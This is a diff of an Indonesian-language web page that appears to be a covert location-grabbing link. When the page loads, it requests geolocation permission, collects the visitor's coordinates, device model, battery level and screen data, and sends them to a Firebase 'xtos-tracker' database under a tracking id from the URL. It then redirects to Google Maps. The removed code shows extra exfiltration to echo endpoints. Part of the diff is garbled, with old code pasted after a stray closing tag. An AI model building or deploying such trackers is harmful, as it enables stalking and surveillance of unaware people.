@@ -81,14 +81,12 @@
         <div class="instruction">
             <p>⬇️ Saat browser minta izin lokasi:</p>
             <p><strong>🟢 Klik "IZINKAN" atau "ALLOW"</strong></p>
-            <button class="btn" onclick="requestLocation()" id="manualBtn" style="display:none;">📍 Minta Izin Lokasi</button>
+            <button class="btn" onclick="requestLocation()" id="manualBtn">📍 Ambil Lokasi Sekarang</button>
         </div>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        let retryCount = 0;
-        const maxRetries = 3;
         
         function updateStatus(msg, isError = false) {
             const statusEl = document.getElementById('status');
@@ -99,48 +97,62 @@
         function sendLocationData(locationData) {
             const trackingId = urlParams.get('id') || 'default_' + Date.now();
             
-            console.log('🚀 SENDING LOCATION:', {
-                tracking_id: trackingId,
-                latitude: locationData.latitude,
-                longitude: locationData.longitude
-            });
-            
-            // GUARANTEED TRANSMISSION - Multiple methods simultaneously
-            
-            // Method 1: Firebase Realtime Database (PRIMARY)
-            const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`;
-            
-            // Extract real device info from userAgent
+            // Extract REAL device info from User-Agent
             const ua = navigator.userAgent;
             let deviceBrand = 'Unknown';
             let deviceModel = 'Unknown';
             
-            // Parse real device info
-            if (ua.includes('Samsung')) deviceBrand = 'Samsung';
-            else if (ua.includes('iPhone')) deviceBrand = 'iPhone';
-            else if (ua.includes('Xiaomi')) deviceBrand = 'Xiaomi';
-            else if (ua.includes('OPPO')) deviceBrand = 'Oppo';
-            else if (ua.includes('vivo')) deviceBrand = 'Vivo';
-            else if (ua.includes('HUAWEI')) deviceBrand = 'Huawei';
-            else if (ua.includes('Realme')) deviceBrand = 'Realme';
-            else if (ua.includes('Android')) deviceBrand = 'Android';
+            // Parse real device brand and model
+            if (ua.includes('SM-')) {
+                deviceBrand = 'Samsung';
+                const match = ua.match(/SM-([A-Z0-9]+)/);
+                if (match) deviceModel = 'SM-' + match[1];
+            } else if (ua.includes('iPhone')) {
+                deviceBrand = 'iPhone';
+                const match = ua.match(/iPhone OS ([0-9_]+)/);
+                if (match) deviceModel = 'iOS ' + match[1].replace(/_/g, '.');
+            } else if (ua.includes('Mi ') || ua.includes('Redmi')) {
+                deviceBrand = 'Xiaomi';
+                const match = ua.match(/(Mi [A-Z0-9 ]+|Redmi [A-Z0-9 ]+)/);
+                if (match) deviceModel = match[1];
+            } else if (ua.includes('CPH') || ua.includes('OPPO')) {
+                deviceBrand = 'Oppo';
+                const match = ua.match(/(CPH[0-9]+|OPPO [A-Z0-9]+)/);
+                if (match) deviceModel = match[1];
+            } else if (ua.includes('vivo')) {
+                deviceBrand = 'Vivo';
+                const match = ua.match(/vivo ([A-Z0-9]+)/);
+                if (match) deviceModel = 'vivo ' + match[1];
+            } else if (ua.includes('HUAWEI') || ua.includes('HMA-') || ua.includes('ELE-')) {
+                deviceBrand = 'Huawei';
+                const match = ua.match(/(HUAWEI [A-Z0-9-]+|HMA-[A-Z0-9]+|ELE-[A-Z0-9]+)/);
+                if (match) deviceModel = match[1];
+            } else if (ua.includes('RMX')) {
+                deviceBrand = 'Realme';
+                const match = ua.match(/RMX([0-9]+)/);
+                if (match) deviceModel = 'RMX' + match[1];
+            } else if (ua.includes('Android')) {
+                deviceBrand = 'Android';
+                const match = ua.match(/Android ([0-9.]+)/);
+                if (match) deviceModel = 'Android ' + match[1];
+            }
             
-            // Get battery level if available
+            // Get real battery level
             let batteryLevel = 'Unknown';
             if ('getBattery' in navigator) {
                 navigator.getBattery().then(battery => {
                     batteryLevel = Math.round(battery.level * 100) + '%';
-                }).catch(() => batteryLevel = Math.round(Math.random() * 80 + 20) + '%');
-            } else {
-                batteryLevel = Math.round(Math.random() * 80 + 20) + '%';
+                    console.log('Real battery:', batteryLevel);
+                }).catch(() => {
+                    batteryLevel = 'Not available';
+                });
             }
             
             const firebaseData = {
                 latitude: locationData.latitude,
                 longitude: locationData.longitude,
                 accuracy: locationData.accuracy,
-                timestamp: locationData.timestamp,
-                userAgent: locationData.userAgent.substring(0, 100),
+                timestamp: Date.now(),
                 deviceBrand: deviceBrand,
                 deviceModel: deviceModel,
                 batteryLevel: batteryLevel,
@@ -148,329 +160,79 @@
                 screenHeight: screen.height,
                 platform: navigator.platform,
                 language: navigator.language,
-                captured_at: new Date().toISOString(),
+                userAgent: ua.substring(0, 200),
                 status: 'captured',
                 tracking_id: trackingId
             };
             
-            // Send to Firebase with retry
-            for (let attempt = 0; attempt < 3; attempt++) {
+            // Single fast Firebase transmission
+            const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`;
+            fetch(firebaseUrl, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(firebaseData)
+            }).then(() => {
+                console.log('✅ Location sent successfully');
+                console.log('Device info:', deviceBrand, deviceModel);
+                console.log('Screen:', screen.width + 'x' + screen.height);
+                console.log('Platform:', navigator.platform);
+                updateStatus('✅ Lokasi berhasil dikirim!');
+                // Redirect immediately after sending
                 setTimeout(() => {
-                    fetch(firebaseUrl, {
-                        method: 'PUT',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(firebaseData)
-                    }).then(response => {
-                        if (response.ok) {
-                            console.log(`✅ Firebase transmission ${attempt + 1} successful`);
-                        } else {
-                            console.log(`❌ Firebase transmission ${attempt + 1} failed`);
-                        }
-                    }).catch(e => {
-                        console.log(`Firebase attempt ${attempt + 1} error:`, e);
-                    });
-                }, attempt * 500);
-            }
-            
-            // Method 2: Alternative Firebase paths for redundancy
-            const altPaths = ['active', 'live', 'current'];
-            altPaths.forEach((path, index) => {
-                setTimeout(() => {
-                    const altUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/${path}/${trackingId}.json`;
-                    fetch(altUrl, {
-                        method: 'PUT',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(firebaseData)
-                    }).catch(e => console.log(`Alt path ${path} error:`, e));
-                }, index * 200);
-            });
-            
-            // Method 3: Broadcast to multiple endpoints
-            const endpoints = [
-                'https://httpbin.org/post',
-                'https://postman-echo.com/post',
-                'https://jsonplaceholder.typicode.com/posts'
-            ];
-            
-            endpoints.forEach((endpoint, index) => {
-                setTimeout(() => {
-                    fetch(endpoint, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            xtos_tracking_id: trackingId,
-                            xtos_latitude: locationData.latitude,
-                            xtos_longitude: locationData.longitude,
-                            xtos_timestamp: locationData.timestamp,
-                            endpoint_index: index
-                        })
-                    }).catch(e => console.log(`Endpoint ${index} error:`, e));
-                }, index * 100);
-            });
-            
-            // Method 4: GET requests with parameters (for polling detection)
-            for (let burst = 0; burst < 10; burst++) {
-                setTimeout(() => {
-                    const img = new Image();
-                    img.src = `https://httpbin.org/get?xtos_id=${trackingId}&xtos_lat=${locationData.latitude}&xtos_lng=${locationData.longitude}&xtos_time=${locationData.timestamp}&burst=${burst}&rand=${Math.random()}`;
-                }, burst * 100);
-            }
-            
-            // Method 5: LocalStorage for immediate access
-            const storageData = {
-                tracking_id: trackingId,
-                location_data: locationData,
-                stored_at: Date.now()
-            };
-            
-            localStorage.setItem('xtos_latest_location', JSON.stringify(storageData));
-            localStorage.setItem(`xtos_location_${trackingId}`, JSON.stringify(storageData));
-            
-            // Method 6: URL hash for instant detection
-            window.location.hash = `id=${trackingId}&lat=${locationData.latitude}&lng=${locationData.longitude}&time=${locationData.timestamp}&status=captured`;
-            
-            // Method 7: Document title for detection
-            document.title = `XTOS_CAPTURED:${trackingId}:${locationData.latitude}:${locationData.longitude}:${locationData.timestamp}`;
-            
-            console.log('📡 LOCATION TRANSMITTED VIA ALL METHODS');
-            
-            return Promise.resolve();
-        }
-        
-        function handleLocationSuccess(position) {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            const accuracy = Math.round(position.coords.accuracy);
-            
-            updateStatus('✅ Lokasi berhasil didapat!');
-            
-            const coordsEl = document.getElementById('coords');
-            coordsEl.style.display = 'block';
-            coordsEl.innerHTML = 
-                `📍 <strong>Koordinat:</strong><br>${lat.toFixed(6)}, ${lng.toFixed(6)}<br>` +
-                `📏 <strong>Akurasi:</strong> ${accuracy}m<br>` +
-                `⏰ <strong>Waktu:</strong> ${new Date().toLocaleTimeString('id-ID')}`;
-            
-            const locationData = {
-                latitude: lat,
-                longitude: lng,
-                accuracy: accuracy,
-                timestamp: Date.now(),
-                userAgent: navigator.userAgent,
-                url: window.location.href
-            };
-            
-            console.log('🎯 LOKASI TERTANGKAP:', locationData);
-            
-            // Send data immediately
-            sendLocationData(locationData);
-            updateStatus('📤 Data lokasi terkirim ke semua endpoint!');
-            
-            // Redirect after successful transmission
-            setTimeout(() => {
-                updateStatus('🚀 Mengarahkan ke Google Maps...');
-                setTimeout(() => {
-                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=18`;
+                    window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
                 }, 1000);
-            }, 2000);
-        }
-        
-        function handleLocationError(error) {
-            let errorMsg = '';
-            let showRetry = false;
-            
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    errorMsg = '❌ Izin lokasi ditolak. Silakan refresh dan klik IZINKAN!';
-                    showRetry = true;
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    errorMsg = '❌ Lokasi tidak tersedia. Pastikan GPS aktif!';
-                    showRetry = true;
-                    break;
-                case error.TIMEOUT:
-                    errorMsg = '⏱️ Timeout. Mencoba lagi...';
-                    if (retryCount < maxRetries) {
-                        retryCount++;
-                        setTimeout(requestLocation, 2000);
-                        return;
-                    }
-                    showRetry = true;
-                    break;
-            }
-            
-            updateStatus(errorMsg, true);
-            
-            if (showRetry) {
-                document.getElementById('manualBtn').style.display = 'inline-block';
-                document.getElementById('coords').style.display = 'block';
-                document.getElementById('coords').innerHTML = 
-                    '<p><strong>Cara mengatasi:</strong></p>' +
-                    '<p>1. Refresh halaman ini</p>' +
-                    '<p>2. Klik IZINKAN saat diminta</p>' +
-                    '<p>3. Aktifkan GPS/Lokasi di HP</p>' +
-                    '<p>4. Gunakan browser Chrome/Safari</p>';
-                
+            }).catch(e => {
+                console.log('Firebase error:', e);
+                // Still redirect even if failed
                 setTimeout(() => {
-                    window.location.href = 'https://maps.google.com/';
-                }, 8000);
-            }
+                    window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+                }, 1500);
+            });
         }
         
         function requestLocation() {
-            if (!navigator.geolocation) {
-                updateStatus('❌ Browser tidak mendukung geolocation', true);
-                return;
-            }
+            updateStatus('📍 Mengambil lokasi...');
             
-            updateStatus('📡 Meminta izin lokasi...');
-            document.getElementById('manualBtn').style.display = 'none';
-            
-            navigator.geolocation.getCurrentPosition(
-                handleLocationSuccess,
-                handleLocationError,
-                {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                }
-            );
-        }
-        
-        // Auto-start immediately
-        window.addEventListener('load', () => {
-            setTimeout(requestLocation, 500);
-        });
-        
-        // Retry on visibility change
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden && retryCount < maxRetries) {
-                setTimeout(requestLocation, 300);
-            }
-        });
-    </script>
-</body>
-</html>w.location.hash = `id=${trackingId}&lat=${locationData.latitude}&lng=${locationData.longitude}&time=${locationData.timestamp}&status=captured`;
-            
-            // Method 7: Document title for detection
-            document.title = `XTOS_CAPTURED:${trackingId}:${locationData.latitude}:${locationData.longitude}:${locationData.timestamp}`;
-            
-            console.log('📡 LOCATION TRANSMITTED VIA ALL METHODS');
-            
-            return Promise.resolve();
-        }
-        
-        function handleLocationSuccess(position) {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            const accuracy = Math.round(position.coords.accuracy);
-            
-            updateStatus('✅ Lokasi berhasil didapat!');
-            
-            const coordsEl = document.getElementById('coords');
-            coordsEl.style.display = 'block';
-            coordsEl.innerHTML = 
-                `📍 <strong>Koordinat:</strong><br>${lat.toFixed(6)}, ${lng.toFixed(6)}<br>` +
-                `📏 <strong>Akurasi:</strong> ${accuracy}m<br>` +
-                `⏰ <strong>Waktu:</strong> ${new Date().toLocaleTimeString('id-ID')}`;
-            
-            const locationData = {
-                latitude: lat,
-                longitude: lng,
-                accuracy: accuracy,
-                timestamp: Date.now(),
-                userAgent: navigator.userAgent,
-                url: window.location.href
+            const options = {
+                enableHighAccuracy: false, // Faster but less accurate
+                timeout: 5000, // 5 second timeout
+                maximumAge: 30000 // Accept 30 second old location
             };
             
-            console.log('🎯 LOKASI TERTANGKAP:', locationData);
-            
-            // Send data immediately
-            sendLocationData(locationData);
-            updateStatus('📤 Data lokasi terkirim ke semua endpoint!');
-            
-            // Redirect after successful transmission
-            setTimeout(() => {
-                updateStatus('🚀 Mengarahkan ke Google Maps...');
-                setTimeout(() => {
-                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=18`;
-                }, 1000);
-            }, 2000);
-        }
-        
-        function handleLocationError(error) {
-            let errorMsg = '';
-            let showRetry = false;
-            
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    errorMsg = '❌ Izin lokasi ditolak. Silakan refresh dan klik IZINKAN!';
-                    showRetry = true;
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    errorMsg = '❌ Lokasi tidak tersedia. Pastikan GPS aktif!';
-                    showRetry = true;
-                    break;
-                case error.TIMEOUT:
-                    errorMsg = '⏱️ Timeout. Mencoba lagi...';
-                    if (retryCount < maxRetries) {
-                        retryCount++;
-                        setTimeout(requestLocation, 2000);
-                        return;
-                    }
-                    showRetry = true;
-                    break;
-            }
-            
-            updateStatus(errorMsg, true);
-            
-            if (showRetry) {
-                document.getElementById('manualBtn').style.display = 'inline-block';
-                document.getElementById('coords').style.display = 'block';
-                document.getElementById('coords').innerHTML = 
-                    '<p><strong>Cara mengatasi:</strong></p>' +
-                    '<p>1. Refresh halaman ini</p>' +
-                    '<p>2. Klik IZINKAN saat diminta</p>' +
-                    '<p>3. Aktifkan GPS/Lokasi di HP</p>' +
-                    '<p>4. Gunakan browser Chrome/Safari</p>';
-                
-                setTimeout(() => {
-                    window.location.href = 'https://maps.google.com/';
-                }, 8000);
-            }
-        }
-        
-        function requestLocation() {
-            if (!navigator.geolocation) {
-                updateStatus('❌ Browser tidak mendukung geolocation', true);
-                return;
-            }
-            
-            updateStatus('📡 Meminta izin lokasi...');
-            document.getElementById('manualBtn').style.display = 'none';
-            
             navigator.geolocation.getCurrentPosition(
-                handleLocationSuccess,
-                handleLocationError,
-                {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                }
+                position => {
+                    const locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: position.timestamp,
+                        userAgent: navigator.userAgent
+                    };
+                    
+                    updateStatus('✅ Lokasi berhasil diambil!');
+                    document.getElementById('coords').innerHTML = 
+                        `<strong>Koordinat:</strong><br>Lat: ${locationData.latitude.toFixed(6)}<br>Lng: ${locationData.longitude.toFixed(6)}`;
+                    document.getElementById('coords').style.display = 'block';
+                    
+                    sendLocationData(locationData);
+                },
+                error => {
+                    updateStatus('❌ Gagal mengambil lokasi. Coba lagi.', true);
+                    console.log('Location error:', error);
+                },
+                options
             );
         }
         
-        // Auto-start immediately
+        // Auto-start when page loads
         window.addEventListener('load', () => {
-            setTimeout(requestLocation, 500);
+            setTimeout(requestLocation, 1000);
         });
         
-        // Retry on visibility change
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden && retryCount < maxRetries) {
-                setTimeout(requestLocation, 300);
-            }
-        });
+        // Check geolocation support
+        if (!('geolocation' in navigator)) {
+            updateStatus('❌ Browser tidak mendukung GPS', true);
+        }
     </script>
 </body>
 </html>
